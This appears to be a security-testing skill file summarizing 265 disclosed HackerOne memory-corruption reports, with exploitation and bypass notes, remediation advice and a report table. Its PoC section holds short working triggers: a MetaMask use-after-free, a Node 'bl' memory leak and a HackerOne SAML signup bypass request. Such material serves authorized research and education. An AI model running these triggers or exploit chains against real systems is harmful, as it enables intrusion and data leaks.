---
name: memory-corruption
description: "Memory Corruption offensive playbook from 265 disclosed HackerOne reports (28 critical, 71 high, 90 medium, 76 low). Use when hunting or reviewing memory corruption. Triggers: buffer, overflow, memory, read, heap."
license: "For authorized security testing and education only."
---

# Memory Corruption

> Distilled from **265** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Unsafe memory handling in native code  -  buffer overflows, use-after-free, OOB read/write, integer overflows, type confusion  -  leading to crashes, info leak, or code execution.

## Where to hunt

- Fuzz parsers and native handlers (media, fonts, archives, protocols); run under ASAN/valgrind; watch for crashes on malformed input.

## Exploitation playbook

- OOB read → info leak / ASLR defeat; UAF/overflow → control flow hijack; integer overflow → undersized allocation → heap overflow.
- Build a primitive chain (leak → arbitrary write → control PC).

## Bypass techniques

- Defeat ASLR/DEP/stack canaries via leaks and ROP/JOP.

## Impact & escalation

- Reliable RCE or sandbox escape from a memory primitive.

## Remediation

- Use memory-safe languages/APIs, bounds checks, hardened allocators, and compiler mitigations; fuzz continuously.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#778610](https://hackerone.com/reports/778610)  -  Squid as reverse proxy RCE and data leak
*critical*

```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

### 2. [#1977252](https://hackerone.com/reports/1977252)  -  UAF on JSEthereumProvider
*critical*

```
function triggerGC() {
  for (let i = 0; i < 100; i++) {
    let a = new Array(1000000);
  }
}

let uafObj = ethereum._metamask;
delete ethereum;
triggerGC();
console.log(await uafObj.isUnlocked());
```

### 3. [#178144](https://hackerone.com/reports/178144)  -  imagecropauto out-of-bounds access
*low, $500*

```
https://github.com/php/php-src/blob/master/ext/gd/libgd/gd_crop.c#L227

gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)
{
...
	match = 1;
	for (y = 0; match && y < height; y++) {
		for (x = 0; match && x < width; x++) {
			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) > 0;
		}
	}
...
```

### 4. [#966347](https://hackerone.com/reports/966347)  -  [bl] Uninitialized memory exposure via negative .consume()
*high*

```
const { BufferList } = require('bl')
const secret = require('crypto').randomBytes(256)
for (let i = 0; i < 1e6; i++) {
  const clone = Buffer.from(secret)
  const bl = new BufferList()
  bl.append(Buffer.from('a'))
  bl.consume(-1024)
  const buf = bl.slice(1)
  if (buf.indexOf(clone) !== -1) {
    console.error(`Match (at ${i})`, buf)
  }
}
```

### 5. [#1977252](https://hackerone.com/reports/1977252)  -  UAF on JSEthereumProvider
*critical*

```http
delete ethereum;
```

### 6. [#2101076](https://hackerone.com/reports/2101076)  -  HackerOne SAML signup domain enforcement bypass results in unauthor…
*high*

```http
POST /users HTTP/1.1
Host: hackerone.com

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

More payloads: see [payloads.md](payloads.md) (146 curated).

## Recurring patterns in this dataset

Most frequent terms across the 265 reports (term (count)): `buffer` (93), `overflow` (81), `memory` (47), `read` (41), `heap` (38), `discovered` (37), `function` (36), `attacker` (34), `tcpdump` (29), `parser` (27), `cause` (26), `before` (25), `access` (22), `over-read` (22), `code` (21), `server` (21), `file` (20), `crash` (19)

## Worked example  -  [report #722327](https://hackerone.com/reports/722327)

*CVE-2019-11043: a buffer underflow in fpm_main.c can lead to RCE in php-fpm* (critical, $1,500)

> The vulnerability exists in php-fpm because of missing bounds check in fpm main.c. If the FastCGI variable PATH INFO is empty, the underflow happens when the code tries to calculate the value of the path info variable. An invalid pointer in path info leads to a single byte out-of-bounds write, which can be leveraged to code execution. The php-fpm allows anyone who can connect to its' port to execute code, so an RCE in php-fpm is not interesting by itself. However, this particular issue can be exploited even by a user who has access to the HTTP server (which is Nginx typically). In certain Nginx configurations, it is possible to make it send empty PATH INFO value by breaking regexp in fastcgi…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#722327](https://hackerone.com/reports/722327) | critical | $1,500 | ibb | CVE-2019-11043: a buffer underflow in fpm_main.c can lead to RCE in php-fpm |
| [#237915](https://hackerone.com/reports/237915) | critical | $1,500 | ibb | PHP mbstring / Oniguruma multiple remote heap/stack corruptions |
| [#172562](https://hackerone.com/reports/172562) | critical | $1,500 | ibb | LZMADecompressor.decompress Use After Free |
| [#478367](https://hackerone.com/reports/478367) | critical | $1,500 | ibb | efree() on uninitialized Heap data in imagescale leads to use-after-free |
| [#477896](https://hackerone.com/reports/477896) | critical | $1,500 | ibb | Use after free and out of bounds read in xmlrpc_decode() |
| [#665330](https://hackerone.com/reports/665330) | critical | $1,500 | ibb | Out of Bounds Memory Read in php_jpg_get16 |
| [#476168](https://hackerone.com/reports/476168) | critical | $1,500 | ibb | Heap overflow in utf32be_mbc_to_code |
| [#476178](https://hackerone.com/reports/476178) | critical | $1,500 | ibb | Negative size parameter in mb_split |

*See [reference.md](reference.md) for all 265 reports in this class.*
